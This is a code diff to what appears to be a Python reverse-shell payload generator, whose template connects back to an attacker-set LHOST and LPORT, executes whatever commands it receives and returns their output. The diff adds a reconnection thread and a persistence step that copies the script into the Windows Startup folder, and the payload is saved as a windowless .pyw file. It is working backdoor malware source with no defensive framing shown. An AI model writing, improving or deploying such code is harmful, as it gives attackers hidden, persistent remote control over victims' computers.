@@ -9,11 +9,20 @@ import socket
 import threading
 import sys
 import time
+import os
 import subprocess as sp
 LHOST = "{LHOST}"
 LPORT = {LPORT}
 
 client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+def checkConnection():
+    try:
+        client.send('')
+    except:
+        TryAgain()
+    time.sleep(20)
+
 def TryAgain():
     while True:
         try:
@@ -27,12 +36,16 @@ def Cont():
     def getCommand():
         while True:
            # try:
-            msg = client.recv(2048).decode()
-            output = sp.getoutput(msg)
-            if output != '':
-                client.send(output.encode())
-            else:
-                os.system(msg)
+            try:
+                msg = client.recv(2048).decode()
+                output = sp.getoutput(msg)
+                if msg.startswith('cd') and msg != 'cd':
+                    os.system(msg)
+                else:
+                    client.send(output.encode())
+            except:
+                pass
+
             #except:
               #  print('Error')
 
@@ -43,7 +56,12 @@ def Cont():
     sendConnection()
 tryagainthread = threading.Thread(target=TryAgain)
 tryagainthread.start()
+checkConnectionThread = threading.Thread(target=checkConnection)
+checkConnectionThread.start()
+username = os.getlogin()
+os.system(f'COPY "'+sys.argv[0]+'" "C:/Users/'+username+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"')
     
+
 """
 write = open('Payloads/Generated/payload.pyw','w')
 write.write(payload)
